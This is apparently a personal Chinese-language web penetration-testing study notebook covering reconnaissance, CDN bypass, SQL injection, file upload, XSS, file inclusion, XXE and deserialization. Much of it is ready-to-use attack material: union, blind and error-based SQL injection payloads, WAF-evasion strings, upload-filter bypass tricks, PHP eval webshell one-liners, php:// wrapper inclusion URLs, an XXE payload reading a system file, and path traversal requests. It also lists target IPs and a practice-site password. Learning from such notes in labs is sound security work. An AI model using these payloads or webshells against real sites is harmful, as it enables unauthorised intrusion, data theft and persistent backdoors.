# 

测试ip

```url
140.143.28.158
60.165.254.21
221.207.203.172 
wap.bosera123.com  //杀猪盘
使用任何网上工具时，注意使用火绒剑查看对方ip地址，如果是webshell，可以运行后f12查看网络发包，或者使用虚拟机运行
```

### 1.基础入门

1. ##### 请求数据包Request
   
   1. 请求行，请求头，请求体
   
2. ##### 响应数据包Response
   
   1. 状态行，响应头标，响应数据
   2. 响应码：1收到 2成功 3重定向 4客户端错误 5服务器错误
   
3. ##### burpsuite抓包更改信息：墨者学院练习
   
   1. php修改ip来源：请求头添加 x-forwarded-for:172.16.1.1 
   2. 微信公众号信息伪造：请求头修改user-agent为微信特有api   Mozilla/5.0 (iPhone; CPU iPhone OS 13_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 MicroMessenger/7.0.11(0x17000b21) NetType/4G
   
4. ##### Vulhub 

   [vulhub启动]: https://vulhub.org/#/docs/run/

   1. 启动docker：service start docker
   2. 启动环境：进入相应目录（kali,cd home/jang/xiazai/vulhub/xxx），docker-compose up -d
   3. 关闭：docker-compose down

5. <img src="C:\Users\Jang\AppData\Roaming\Typora\typora-user-images\image-20210407203956727.png" alt="image-20210407203956727" style="zoom: 67%;" />

6. ##### ASP,PHP等源码下的针对漏洞

   1. 找网站cms，去云溪等cms指纹识别网站；或直接找f12找特殊名字文件复制到百度查询相关cms
   2. 找cms的相关漏洞---漏洞利用
   3. 找不到漏洞---查源码，进入默认数据库

7. ##### 源码应用分类下的针对漏洞

   1. 功能越多，漏洞越多，针对业务逻辑找漏洞

8. ##### 简要目标从识别到源码获取

9. <img src="C:\Users\Jang\AppData\Roaming\Typora\typora-user-images\image-20210408122945373.png" alt="image-20210408122945373" style="zoom:67%;" />

10. ##### 识别操作系统常见方法：

    1. ping ttl包值
    2. 域名换大小写
    3. nmap -o

11. ##### 数据库层面

    1. asp+access
    2. php+mysql  3306
    3. aspx+mssql  1433
    4. jsp+mssql,orcle  1521
    5. python+mongodb 27017

12. ##### 加密编码

    1. url  ：前面有%
    2. MD5：32位
    3. base64：最后有=，若解密出来是乱码，则可能是aes加密
    4. unescape:前面有%加四位数字
    5. 加密形式：
       1. 直接加密，带salt，带密码，带偏移，带位数，带模式，带干扰
    6. 解密形式：枚举，自定义逆行，可逆向
    7. cmd5.com
    8. sql注入方式要按照网站的加密方式来写



------



### 2.信息收集

#### 2.1 CDN绕过

1. CDN作用：缓存网页，针对不同运行商采用不同ip地址
2. 为什么绕过：存在同步时间差，扫描到的不是真正的网页
3. CDN判断存在：多地点ping网址，响应ip不同则存在
4. 常见绕过技术
   1. 子域名查询  get-site-ip.com  ping.chinz.com x.threatbook.cn asm.ca.com
   2. 邮件服务查询
   3. 国外地址请求
   4. 遗留文件，扫描全网
   5. 黑暗引擎搜索特定文件：zoomeye,fofa,shodan（hash文件值搜索真实ip地址）
   6. dns历史记录
5. 绕过后改本地host为真实ip

#### 2.2 架构、搭建WAF

1. 目录型站点分析：同一www目录下两个文件夹放了两套系统，通过目录切换
2. 端口型站点分析：同一www目录下两个文件夹放了两套系统，通过端口切换
3. 子域名站点分析：子域名两套CMS，两个ip
4. 类似域名站点分析：大公司或非法网站常用
5. 旁注（同服务器不同站点），c段站点（同网段不同服务器不同站点）分析：旁注查询百度
6. 一体化特征搭建：F12写的软件特别全面，一般都是一体化软件搭建
7. WAF（web application firefall）查询
   1. waf00f:github.com/EnableSecurity/wafw00f    

#### 2.3 APP及其他财产

1. 涉及WEB---转换成web攻击
   1. APK一键反编译
   2. 模拟器 利用burp历史抓URL
2. 非web协议（区分测试方法）---尝试提取，反编译逆向

#### 2.4 资产拓展

1. 资产信息（侧面）: 以上平台信息/whois备案/github等监控
2. 第三方应用（从这些入手）: 数据库应用/各种管理平台/各种第三方应用
3. 各种服务接口（发现更多未知接口尝试）: 存储服务/支付服务/内部服务...
4. 微信公众号（发现更多未知应用）
5. 内部群内部应用等（社工或发现）: QQ或微信群/工作群/其他通讯群聊

#### 2.5 练习网站：

1. butian.net :Aa123456     
2.  xianzhi.aliyun.com

<img src="https://github.com/bit4woo/teemo/blob/master/doc/xmind.png?raw=true" alt="xmind.png" style="zoom: 80%;" />

​	第三方接口

https://crt.sh 	查询证书

https://dnsdb.io	查dns记录

htps:/ools ipip.net/cdn.php	

https://github.com/bit4woo/teemo

https://securitytrails.com/	

opengps查询ip地址



------



### 3.WEB漏洞

```
数据库：
ACESS:表、列、数据，无库与集合表，只能纯猜
	https://blog.csdn.net/u014029795/article/details/91150847   //偏移注入
MongoDB:键值对形式查询，区分大小写  NoSQLAttack
	?id=1'});return ({title:1,content:'2 	//回显
	?id=1'});return ({title:tojson(db),content:'1	//爆库
	?id=1'});return ({title:tojson(db.getCollectionNames()),content:'1	//爆表
	?id=1'});return ({title:tojson(db.Authority_confidential.find()[0]),content:'//爆字段,0就是第一个数据
SQL:
	and exists(select * from sysobjects//判断数据库类型
	and substring((select @@version),22,4)='2008'//判断数据库版本
	and 1=(select quotename(name)from master..sysdatabases FOR XML PATH(''))--//获取数据库
	and db_name()>0
	and 1=(select db_name())--//获取当前数据库
	and 1=(select quotename(name)from xx_db..sysobject where xtype='U' FOR XML PATH(''))--//获取当前数据库的表
	and 1=(select quotename(name) from xx_db..syscolumns where id=(select id from xx_db where name='xx_table') FOR XML PATH(''))--//获取表的列名
Oracle:网上找相关代码
PostgreSQL: id=-1 union all select null,null,[query]
```

#### 3.1 SQL注入

[Sql注入基本思路]: https://www.cnblogs.com/20175211lyz/p/11210936.html
[ SQL注入拓展]: https://www.cnblogs.com/20175211lyz/p/11204022.html
[限制条件下获取表名、无列名注入]: https://www.cnblogs.com/20175211lyz/p/12358725.html



1. ##### 数据库类型：MYSQL

   1. 发现数据库有对应关系
   2. ?id=1 order by 正确与错误临界点; //判断注入，猜列名数量（字段数） 
   3. ?id=-1 union select 1,2,3;  //报错显示
   4. 信息收集
      1. 数据库版本：version()
      2. 数据库名字：database()
      3. 数据库用户：user()
      4. 操作系统：@@version_compile_os
      5. 在mysql5.0以上版本中，mysql存在一一个自带数据库名为information_ schema, 它是一个存储记录有所有数据库名，表名，列名的数据库，也相当于可以通过查询它获取指定数据库下面的表名或列名信息。
         ```
         1. information_schema.tables：记录所有表名信息的表
         2. information_schema.columns：记录所有列名信息的表
         3. table_schema:数据库名
         4. table_name:表名
         5. column_name:列名
         ```
      6. ?id=-1 union select 1,database(),version(), //替换2,3
      7. ?id=-1 union select 1,group_concat(schema_name),2 from information_schemata
      8. ?id=-1 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='上面查的数据库名字'   //替换2，不换3 查数据库下所有表名信息
      9. ?id=-1 union select 1,group_concat(column_name),3 from information_schema.columns where table_name='上面查的表名字'   //替换2，不换3 查上诉表名下所有列名信息
      10. ?id=-1 union select 1,group_concat(username),group_concat(password) from security.users  //显示的数字替换成自己想要的列数据
      11. ?id=-1 union select 1,2,group_concat(concat_ws(A,'-',B)) from security.users  //拼接AB字符串爆库

2. ##### 高权限注入及低权限注入
   
   1. 跨库查询及应用思路：information_schema表特征，记录库名，表名，列名对应表
   2. 获取所有数据**库**名：?id=-1 union select 1,group_concat(schem_name),3 from information_schema.schemata
   3. 获取指定xx_schema数据库**表**名：?id=-1 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='xx_schema'
   4. 获取指定xx_schema库下xx_table表的**列**名信息：?id=-1 union select 1,group_concat(column_name),3 from information_schema.columns where table_name='xx_schema' and table_schema='xx_table'
   5. 获取指定数据：?id=-1 union select 1,group_concat(user),password from xx_schema.xx_table
   6. 低版本：字典暴力
   
3. ##### 文件读写操作
   
   1. load_file()：select loadfile('c:/xx.txt')
   2. into outfile 或 into dumpinfo参数：select x into outfile 'd:/xx.txt'
   3. 路径获取方法：报错显示，遗留文件，漏洞报错，平台配置文件，爆破等
   4. 魔术引号：编码或宽字节注入
   5. 防注入：
      1. 自带：魔术引号
      2. 内置函数：is_int
      3. 自定义关键字：select
      4. WAF
   
4. ##### 提交方法：POST:GET:REQUEST:COOKIE：HTTP头：

5. ##### 数据类型：搜索型：字符型：数字型：

6. ##### 查询方式

   1. select: select * from news where id=$id

   2. insert: insert into news(id,url,text) values(2,'x','$t')  //过滤单引号和括号
      ```mysql
      username=x’ or (select 1 from (select count(*),concat((select(select(selectconcat(0x7e,database(),0x7e))) from information_ schema.tables limit 0,1) ,**floor**(rand(0)*2))x from information_ schema.tables group by x)a) or '
      username=x' or **updatexml**(1,concat(0x7e,**(version()**)),0) or '  //后加粗部分替换自己想要的函数
      username=x' or **extractvalue**(1,concat(0x7e,database())) '  //0x7e是拼接字段符，方便爬虫
      ```
      
   3. update: update user set pwd='$p' where id=2 and username

      ```mysql
   sex=%E7%94%B7&phonenum=13878787788&add=hubeNicky’ or (select 1 from(select count(*),concat( **floor** (rand(0) *2),0x7e,(database()).0x7e) x from information_ scheme.character_sets group by x)a) or '
      sex=%E7%94%B7&phonenum=13878787788&add=hubeNicky' or **updatexml**(1,concat(0x7e,(version()),0) or '
      
      sex=%E7%94%B7&phonenum=13878787788&add=Nicky' or **extractvalue**(1,concat(0x7e,database())) or '
      ```
      
   4. order by:
   
5. delete :
   ```mysql
   /pikachu/vu1/sq1i/sqli_del.php?id=56+or+(select+1+from (select+count(*),concat (**floor**(rand(0) *2),0x7e,(database()),0x7e) x+from+information_schema.character_sets+group+by+x)a)   //加号=空格，抓包拼接时需要，浏览器直接输入时不需要+
      
      pikachu/vu1/sqli/sqli_ del.php?id=56+or+**updatexml**+(1,concat(0x7e,database()),0)
      
      /pikachu/vul/sqli/sqli_del.php?id=56+or+**extractvalue** (1,concat(0x7e,database()))
   ```
   
7. ##### 回显/盲注：
   
   1. 回显注入：注入过程获取的数据回显到前端页面
   2. 无回显注入：获取数据不能回显到前端页面，需要利用一些方法进行判断或尝试
   
8. **延时盲注**--延时判断：if, sleep, 

   ```mysql
   1. select if(database()='pakachu',0,1);  //三目表达式判断数据库名
   
   2. If(ascii(substr(database(),1,1))>115,0,sleep(5))%23
   
   3. select * from member where id=1 and sleep(if(database()='a',5,0));  
   
      select * from member where id=1 and if(database()='a',sleep(5),0)
   
      //判断数据库名是否为a，是则等待5s，不是则直接输出
   
   4. 配合以下函数猜出数据库名
   
      1. and if(mid(database(),1,2)='a',sleep(5),0)    //从位置1开始，截取库名的2位
      2. and if(substr(database(),1,2)='a',sleep(5),0)   //从位置1开始，截取库名的2位
      3. and if(left(database(),1)='a' ,sleep(5),0)    //判断数据库前1位
      4. and if(length(database())=8,sleep(5),0)  //判断数据库名长度
   ```

   

9. **布尔盲注**--逻辑判断：regexp, like, ascii, left, ord, mid, 

   ```mysql
   1. and if(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 1,1),1,1))=101,sleep(3),0)   //substr(a,b,c)从 b 位置开始， 截取字符串 a 的 c 长度  ;判断库的第一个表的第一位ascii码是否等于101；limit 1,1指第2个表，从0开始；mid substr从1开始；
   2. like 'ro%' //判断ro或ro...是否成立
   3. left(database(),1)>'a'    //二分法爆数据库名   left(a,b)从左侧截取 a 的前 b 位  
   4. ORD(MID((SELECT IFNULL(CAST(username AS CHAR),0x20)FROM security.users ORDER
      BY id LIMIT 0,1),1,1))   //mid(a,b,c)从位置 b 开始， 截取 a 字符串的 c 位  ;ord()函数同 ascii()， 将字符转为 ascii 值  
   5. regexp:  and 1=(if((user() regexp '^r'),1,0))    //正则注入，正确反1错误0
   ```

   

10. **报错盲注**--报错回显：floor, updatexml, extractvalue  

      ```mysql
      1. Select 1,count( * ),concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand(0)*2))
         a from information_schema.columns group by a ;   //
      2. select count(*) from information_schema.tables group by concat(version(),
         floor(rand(0) *2))    //
      3. select count( * ) from (select 1 union select null union select !1) group by concat(version(),floor(rand(0)*2))   //关键表禁用
      4.   //rand禁用<img src="C:\Users\Jang\AppData\Roaming\Typora\typora-user-images\image-20210525133000416.png" alt="image-20210525133000416" style="zoom:67%;" />
      5. select exp(~(select * FROM(SELECT USER())a))   //double数值类型超出范围，exp()是以e为底的对数函数，http://www.cnblogs.com/lcamry/articles/5509124.html
      6. select !(select * from (select user())x) - ~0    //bigint溢出，~0是对0逐位取反。http://www.cnblogs.com/lcamry/articles/5509112.html
      7. extractvalue(1,concat(0x7e,(select @@version),0x7e))     //mysql对xml数据进行查询和修改的xpath函数，xpath语法错误
      8. updatexml(1,concat(0x7e,(select @@version),0x7e),1)    //
      9. select * from (select NAME_CONST(version(),1),NAME_CONST(version(),1))x;   //mysql重复特性，此处重复version，所以报错
      ```

      

11. ##### 注入拓展

    1. 加解密注入：分析页面加密方法，将注入语句加密后进行注入
    2. JSON注入：将注入语句改为json语句进行注入
    3. LADP注入：
    4. DNSlog注入：解决了盲注不能回显数据，效率低的问题   ceye.io
    5. 二次注入：
       1. 插入恶意数据：第一次进行数据库插入数据的时候，仅仅对其中的特殊字符进行了转义，在写入数据库的时候还是保留了原来的数据,但是数据本身包含恶意内容。
       2. 引用恶意数据：在将数据存入到了数据库中之后,开发者就认为数据是可信的。 在下一-次需要进行查询的时候 ,直接从数据库中取出了恶意数据,没有进行进一 步的检验和处理,这样就会造成SQL的二次注入。
    6. 堆叠查询：多条语句共同执行
    7. SQLmap:当遇到sqlmap解决的不了的，可以尝试自己写插件注入<img src="C:\Users\Jang\AppData\Roaming\Typora\typora-user-images\image-20210421220055719.png" alt="0" style="zoom:50%;" />中转加密注入

12. ##### WAF绕过：测试WAF有哪些规则不全

    1. 数据
       1. 加解密：
       2. 大小写混合：不一定管用
       3. 等价函数替换：
          1. Hex() bin() == ascii()
          2. Sleep() == benchmark()
          3. Mid()substring() == substr()
          4. @@user == User()
          5. @@Version == version()
       4. 注释符混用：保证语句正常执行的同时  绕过WAF匹配规则(把语句拆分)
          1. /**/   在语句词中间加入
          2. /***/
          3. /* !*/   内联注释
          4. //     --     --+     #    +     :%00     /!**/
       5. 编码解密：
          1. URL:%0A换行  %00截断   %20空格  %21!   %22"    %23#   %24$   %25%   %26&   %27‘   %2829()  
          2. hex,unicode,base64等
       6. 特殊符号混用：

    2. 方式
       1. 更改提交方式：GET  POST  COOKIE等
       2. 变异：POST->multipart/form-data
       
    3. 其他：
       1. Fuzz:暴力测试，通过脚本不断测试哪种编码可以过WAF

       2. 借助数据库特性：

          1. mysql版本号绕过：/*!50001 select * from test */; 50001表示数据库在5.00.01以上版本语句才会执行

       3. 垃圾数据溢出：

       4. HTTP参数污染：?id=1&id=2&id=3<img src="C:\Users\Jang\AppData\Roaming\Typora\typora-user-images\image-20210425140833633.png" alt="image-20210425140833633" style="zoom:50%;" />

       5. 白名单：

          1. IP白名单  --random-agent：从网络层获取ip

             ```html
             X-forwarded-for
             X-remote-IP
             X-originating-IP
             X-remote-addr
             X-Real-ip
             ```

          2. 静态资源：特定静态资源后缀请求，常见静态文件(.js .jpg .swf .css等)不会检测这类文件请求 http:192.168.1.1/sql.php/1.js?id=1

          3. 爬虫白名单：部分WAF有提供爬虫白名单功能，伪造 搜索引擎http指纹头

          4. 代理池：爬虫挂代理

          5. 延迟   --delay

          6. 写py脚本中转：sqlmap去注入本地脚本地址->本地搭脚本(请求数据包自定义表写)->远程地址（直接百度搜  php提交http数据包方法）![image-20210425221638852](C:\Users\Jang\AppData\Roaming\Typora\typora-user-images\image-20210425221638852.png)

          7. 抓包分析错误

    4. 示例：

          ```URL
          注释符，编解码，特殊符号
          id=1 union/*%00*/%23a%0A/*!/*!select 1,2,3*/;%23
          id=-1 union/*%00*/%23a%0A/*!/*!select%201,database%23x%0A(),3*/;%23*
          数据库特性：
          id=-1%20union%20/*!44509select*/%201,2,3%23
          id=-1%20union%20/*!44509select*/%201,%23x%0A/*!database*/(),3%23
          
          参数污染：
          id=1/**&id=-1%20union%20select%201,2,3%23*/ 
          执行代码：SELECT * FROM user WHERE id=-1 union select 1,2,3#*/
          
          id=-1%20union%20all%23%0A%20select%201,2,3%23
          id=-1%20union%20all%23%0a%20se1ect%201,%230%0Adatabase/**/(),3%23
          ```

13. ##### 防御方案：

       1. 代码加载过滤：
       2. WAF部署：
       3. ...

#### 3.2 文件上传

[^CTF文件上传]: https://www.cnblogs.com/20175211lyz/p/10989689.html

```
1. 常规：扫描获取上传、会员中心上传、后台系统上传、各种途径上传
2. CMS类：已知CMS源码
3. 编辑器类：ckeditor,fckeditor,kindeditor,xxxxeditor(网络搜索然后直接利用)
4. 其他/CVE：代码审计、平台/三方应用等

拿到后先看中间件，看是否存在解析漏洞，找文件上传点(字典扫描，会员中心等)，然后验证文件上传是黑名单、白名单还是检测代码；
然后看有无CMS漏洞，再无就找编辑器漏洞，进会员中心等看编辑器类型；
最后找CVE有无文件上传漏洞相关；
```

1. 基础：
   1. 危害：自定义上传，导致后门权限
   2. 查找及判断：扫描，源码，抓包
   
2. 验证/绕过（upload-labs-master靶场，笔记本开启后在台式输入ip进入）：
   1. 前端   JS类防护：改网页代码
   2. 后端
      1. 黑名单（明确不让上传的格式后缀  asp php jsp aspx cgi war）：

         ```
         1. 特殊解析后缀：php3,php5,复制网页源代码，在html中删去脚本，添加action到发送文件处
         2. .htaccess解析：htaccess是apache的一种解析文件，可以修改文件的解析方法
         3. 大小写绕过：大小写混合格式
         4. 点绕过：上传时抓包，在文件名后加 . ，系统存储文件会自动删除末尾. 
         5. 空格绕过：上传时抓包，在文件名后加空格，系统存储文件会自动删除末尾空格[0x20]
         6. ::$$DATA绕过(要求windowns)：上传时抓包，在文件名后加::$$DATA，系统识别为文件流会忽略末尾 
         7. 配合解析漏洞：
         8. 双后缀名绕过：后端没有对文件名进行多次过滤，可以抓包将后缀改为1.pphphp
         9. 一次过滤绕过：后端没有对文件名进行多次过滤，可以抓包将后缀改为1.php.空格.或任意多个点与空格组合
         ```

      2. 白名单（jpg png zip rar gif）：

         ```
         1. MIME绕过:包头的Content-Type修改为白名单类型
         2. %00绕过(有apache版本要求)：地址，%00截断，后续不再读取，抓包文件头保存处修改为../upload/1.php%00(post提交要进行base64 decode)
         3. 0x00截断：文件命名
         4. 0x0a截断：
         ```

      3. 内容及其他：
      
         解析漏洞导致直接可以执行脚本代码、文件包含漏洞(一句话图片 copy 1.png /b +shell.php /a webshell.jpg    <?php @eval($_POST['x']);?>)导致上传图片可以通过该漏洞解析成php
      
         ```
         文件头检测：16进制打开，更改文件头，绕过(要配合文件包含漏洞)
         二次渲染：图片上传上去后能在网站进行二次更改
         条件竞争：条件竞争：图片上传上去后能在网站进行二次更改，涉及逻辑漏洞，如果验证是在上传之后，那么在上传的同时已经把图片保存服务器，所以可以不断访问该文件，占用不让服务器能删除文件
         突破getimagesize：获取图片信息，若不是图片则返回为空(要配合文件包含漏洞)
         突破exif__imagetype：只接受图片，上传正常图(要配合文件包含漏洞)
         /.绕过：文件支持自命名，在上传时候抓包修改为/upload/1.php/.   系统认为该地址是文件
         ```
   
3. 漏洞/修复：

   1. 解析漏洞![image-20210427230506970](C:\Users\Jang\AppData\Roaming\Typora\typora-user-images\image-20210427230506970.png)
   2. CMS漏洞：获取cms指纹后查找漏洞
   3. 其他漏洞

4. WAF绕过：filename,Content-Disposition,Content-Type

   1. 数据溢出---防匹配(xxx...)：类似之前看到的表情包复制粘贴，在filename和name之间插入  **;垃圾参数;**
   2. 符号变异---防匹配('    "   ;  : \n   / ;/) ：去掉filename的一个 "  ，或者改成 '  ，再试试去掉 ;   ，或者提前匹配，前面写"" ，后面再写xx.php ，去防匹配验证  "asd";x.php"
   3. 数据截断---防匹配(%00 ; 换行)：
   4. 重复数据---防匹配(参数多次)：
   5. fuzz模糊测试：通过大量非预料数据测试
   
   ![image-20210524152324261](C:\Users\Jang\AppData\Roaming\Typora\typora-user-images\image-20210524152324261.png)

#### 3.3 XSS跨站

[CTF XSS]: https://www.cnblogs.com/20175211lyz/p/12207467.html

```
插入js代码，对方执行js代码,拿cookie，bp修改x-forwarder-for和cookie登录 
留言板，评论区，订单，反馈
```

1. 原理
   1. 产生原理：产生于前端，未过滤完全
   2. 危害影响
2. 分类
   1. 反射型：单次攻击，不经过数据库(复制构造好url，使对方点击)
   2. 存储型：持续攻击，经过数据库(构造后等待管理员或其他人点击该网站)
   3. DOM型：类似ajax，发包时候发给的是静态前端代码
3. 手法
   1. XSS平台：https://xss8.cc/bdstatic.com/ jang2020 123456，成果都在对方手里，谨慎使用
   2. XSS工具：beef
   3. XSS结合其他漏洞：常见网上大马都有后门，可以修改密码处变成xss注入，对方点击拿到对方cookie
4. 绕过
   1. 代码过滤
   2. http only：防止通过js获取cookie
      1. 浏览器有保存：读取保存数据
      2. 浏览器没保存：表单劫持
   3. WAF拦截
   4. 常规绕过思路：
      1. 标签语法替换：提前闭合、删除部分标签
      2. 特殊符号干扰：/  # 
      3. 提交方式更改：
      4. 垃圾数据溢出：
      5. 加密解密算法：
      6. 结合其他漏洞绕过：
      7. 自动化：xsstrike
5. 修复：输入过滤，输出过滤，搭载过滤器

#### 3.4 CSRF（跨站请求伪装）

1. 原理：黑客模拟修改请求，发送到服务器后，诱导已授权用户打开后修改其信息
2. 检测：抓包修改重发
3. 防御：重要请求需要输入验证码；设置随机Token；检验referer来源，请求时判断

#### 3.5 SSRF（服务器跨站请求伪造）

[CTF SSRF(服务器端伪造请求)]: https://www.cnblogs.com/20175211lyz/p/11408583.html

1. 原理：被黑客通过一个服务器进入内网后查看别的资产，通常是上传请求处(分享、转码、在线翻译、图片加载与下载、图片文章收藏、未公开api)
2. 检测：端口扫描、指纹识别、协议调用(file,http)、漏洞
3. 防御：过滤

#### 3.6 代码执行

1. 脚本：php/java/python
2. 产生：变量可控，漏洞函数
   1. web源码：thinkphp/eyoucms/wordpress
   2. 中间件：Tomcat/Apache/Redis
   3. 其他环境：php-cgi/Jenkins-ci/
3. 检测：
   1. 白盒：代码审计
   2. 黑盒：漏扫工具/公开漏洞/手工看参数及功能
4. 防御：
   1. 敏感函数禁用：eval / assert / call_user_func / call_user_func_array / array_map
   2. 变量过滤或固定
   3. WAF

#### 3.7 命令执行

[命令执行写webshell]: https://mp.weixin.qq.com/s/cSaA6HUX0_j7KzBzAAoE0Q
[CTF RCE与命令注入]: https://www.cnblogs.com/20175211lyz/p/11396392.html

1. 系统：linux/windows
2. 产生：
   1. web源码：Nexus/webmin/ElasticSearch
   2. 中间件：Weblogic/Apache
   3. 其他环境：Postgresql/Samba/Supervisord
3. 检测：
   1. 白盒：代码审计
   2. 黑盒：漏扫工具/公开漏洞/手工看参数及功能
4. 防御：过滤常见命令执行函数（system/exec/shell_exec/passthru/pcntl_exec/）

#### 3.8 文件包含

[CTF 文件包含]: https://www.cnblogs.com/20175211lyz/p/10989816.html

1. 脚本：ASP PHP JSP ASPX Python Javaweb

   ```
   #文件包含各个脚本代码
   ASP,PHP,JSP,ASPX等
   <!--#include file="1.asp -->
   <!--#include file="top.aspx" -->
   <c:import url="http://thief.one/1.jsp">
   <jsp:include page="head.jsp"/>
   <%@ include file="head. jsp"%>
   <?php Include('test.php')?>
   ```

2. 检测：

   1. 白盒：代码审计
   2. 黑盒：漏扫工具/公开漏洞/手工看参数及功能

3. 类型：

   1. 本地包含：加././一直加或者../   %00截断    长度截断(window. > 256  linux>4096)

   2. 远程包含：

      1. 调用远程代码，加' # ? 

      2. 伪协议：

         ```php
         https://www.cnblogs.com/endust/p/11804767.html
         http://127.0.0.1:8080/include.php?filename=php://filter/convert.base64-encode/resource=1.txt
         http://127.0.0.1:8080/include.php?filename=php://inputPost : < ? php system('ver')?>
         <?PHP fputs(fopen('s.php','w'),'<?php @eval($_POST[cmd])?>');?>
         http://127.0.0.1:8080/include.php?filename=file:///D:/phpstudy/PHPTutorial/WWW/1.txt
         http://127.0.0.1:8080/include.php?filename=data://text/plain,<php: phpinfo();?>
         ```

         ![image-20210619232146218](C:\Users\Jang\AppData\Roaming\Typora\typora-user-images\image-20210619232146218.png)

4. 利用：http  ftp file  其他协议

5. 修复：固定后缀  固定文件  WAF

#### 3.9 文件下载

1. 产生：任意语言代码下载功能函数
2. 检测
   1. 白盒：代码审计
   2. 黑盒：漏扫工具/公开漏洞/手工看参数及功能
3. 利用
   1. 常见文件：后台首页日志等可见内容（搜索文件下载漏洞文件地址）
   2. 敏感文件：数据库配置文件/接口文件/秘钥信息
4. 修复：WAF/固定目录或过滤跨目录符号/目录权限设置



#### 3.10 文件读取

1. 产生：任意语言代码获取功能函数
2. 检测：手工看参数及功能
3. 利用：读取敏感文件

#### 3.11 逻辑安全

<img src="C:\Users\Jang\AppData\Roaming\Typora\typora-user-images\image-20210621103617428.png" alt="image-20210621103617428" style="zoom: 67%;" />

1. 越权
   1. 水平越权：同级别用户之间越权
   2. 垂直越权：不同级别用户直接越权
   3. 修复：
      1. 前后端同时对用户输入信息进行校验，双重验证机制
      2. 调用功能前验证用户是否有权限调用相关功能
      3. 执行关键操作前必须验证用户身份，验证用户是否具备操作数据的权限
      4. 直接对象引用的加密资源ID,防止攻击者枚举ID,敏感数据特殊化处理
      5. 永远不要相信来自用户的输入，对于可控参数进行严格的检查与过滤
2. 登录
   1. 暴力破解
   2. 本地加密传输
   3. Cookie脆弱
   4. Session劫持
   5. 密文比对认证
3. 业务
   1. 订单ID
   2. 手机号码
   3. 用户ID
   4. 商品ID
   5. 其他
4. 验证
   1. 暴力破解：重发验证码，根据返回不同确定验证码
   2. 绕过测试：利用bp将返回数据包更改（do intercept），跳过验证
   3. 自动识别：captchakiller
5. 数据
   1. 支付算改
   2. 数量算改
   3. 请求重放
   4. 其他
6. 找回
   1. 客户端回显：有部分会在返回协议包中显示验证码
   2. Response状态值：通过bp改返回包
   3. Session覆盖：bp替换修改自动发包
   4. 弱Token缺陷：bp替换修改自动发包
   5. 找回流程绕过：
   6. 其他
7. 接口
   1. 调用遍历
   2. 参数更改：
   3. 未授权访问
   4. webservice测试
   5. callback自定义
8. 回退：回放
9. 验证安全
   1. TOKEN(一次性安全，及时遗弃)
      1. 爆破：识别加密格式
      2. 回显：页面自动生成token使用，bp套用即可https://www.cnblogs.com/liujizhou/p/11707882.html
      3. 固定
      
   2. 验证码
      1. 爆破：重发
      2. 识别：captcha-killer  pkav_http_fuzz reCAPTCHA
      3. 复用：验证码不变化，可进行账号密码爆破
      4. 回显：
      5. 绕过：通过数据包返回更改绕过

#### 3.12 PHP反序列化

[CTF PHP反序列化]: https://blog.csdn.net/solitudi/article/details/113588692?spm=1001.2014.3001.5502
[CTF PHP反序列化]: https://www.cnblogs.com/20175211lyz/p/11403397.html
[POP链]: https://www.cnblogs.com/20175211lyz/p/12364199.html



```
反序列化字符逃逸、对象注入、POP链构造利用、PHP原生类反序列化利用、Phar反序列化、php-session反序列化
```

<img src="C:\Users\Jang\AppData\Roaming\Typora\typora-user-images\image-20210621114110450.png" alt="image-20210621114110450" style="zoom:50%;" />

1. 原理：序列化就是将对象转换成字符串。反序列化相反，数据的格式的转换对象的序列化利于对象的保存和传输，也可以让多个文件共享对象。未对用户输入的序列化字符串进行检测，导致攻击者可以控制反序列化过程，从而导致代码执行，SQL注入，目录遍历等不可控后果。在反序列化的过程中自动触发了某些魔术方法。
2. 技术
   1. 有类(触发魔术方法)：https://segmentfault.com/a/1190000007250604 
   2. 无类
3. 利用
   1. 真实应用下
   2. 各种CTF比赛中
4. 危害
   1. SQL注入
   2. 代码执行
   3. 目录遍历
   4. ......

#### 3.13 JAVA反序列化

<img src="C:\Users\Jang\AppData\Roaming\Typora\typora-user-images\image-20210621202437955.png" alt="image-20210621202437955" style="zoom:67%;" />

1. 概念：需要保存某一刻对象的信息，来进行一些操作。比如利用反序列化将程序运行的对象状态以二进制形式存储在文件系统中，然后可以在另一个程序中对序列化后的对象状态数据进行反序列化恢复对象。可以有效实现多平台之间通信，对象持久化存储。
2. 利用
   1. Payload生成器:ysoserial
   2. 自定义检测工具或脚本
3. 检测
   1. 黑盒
      1. 数据格式点：HTTP请求中参数、自定义协议、RMI协议
      2. 特点扫描
   2. 白盒
      1. 函数点
      2. 组件点：ysoserial库
      3. 代码点：RCE执行、数据认证
4. 修复

#### 3.14 XML&XEE安全

[CTF XXE]: cnblogs.com/20175211lyz/p/11413335.html	"里面有详细介绍"

```xml-dtd
<!--XML声明-->
<?xml version="1.0" encoding="UTF-8"?>

<!--DTD，这部分可选的-->          
<!DOCTYPE foo [ 
    <!ELEMENT foo ANY >
    <!ENTITY xxe SYSTEM "file:///c:/windows/win.ini" >
]>

<!--文档元素-->                                                                          
<foo>&xxe;</foo>
```

1. 概念
   1. XML：XML用于传输和存储数据。
   2. XXE：全称XML External Entity Injection，即外部实体注入漏洞，发生仔应用程序解析XML时，没有禁用外部实体的加载，导致可加载恶意外部文件，造成文件读取、命令执行、内网端口扫描、攻击内网网站等。
2. 危害
   1. 文件读取
   2. RCE执行
   3. 内网攻击
   4. DOS攻击
3. 检测
   1. 白盒
   2. 黑盒
      1. 人工
         1. 数据格式类型判断：<user>test</user><pass>Mi</pass>
         2. Content-Type值判断：test/xml   application/xml
         3. 更改Content-Type值看返回
      2. 工具
4. 利用
   1. 输出形式
      1. 有回显:http、file
      2. 无回显
   2. 过滤绕过：协议、外部引用、编码
5. 修复：禁用外部实体引用、过滤关键字、WAF产品

#### 3.15 目录遍历

1. 通过目录遍历后获取结构，通过常用文件名或文件夹名进行爆破获得
2. 抓包，修改包头GET信息，将文件名修改为自己想要获取的文件
3. 修改前：GET /pikachu/vul/dir/dir_list.php?title=jarheads.php HTTP/1.1
4. 修改后：GET /pikachu/vul/dir/dir_list.php?title=../../../README.md HTTP/1.1

### 4.JAVA安全



### 5.漏洞发现

#### 5.1 操作系统

1. 探针：Goby  Nmap  Nssus(ip:8834)  OpenVAS  Nexpose
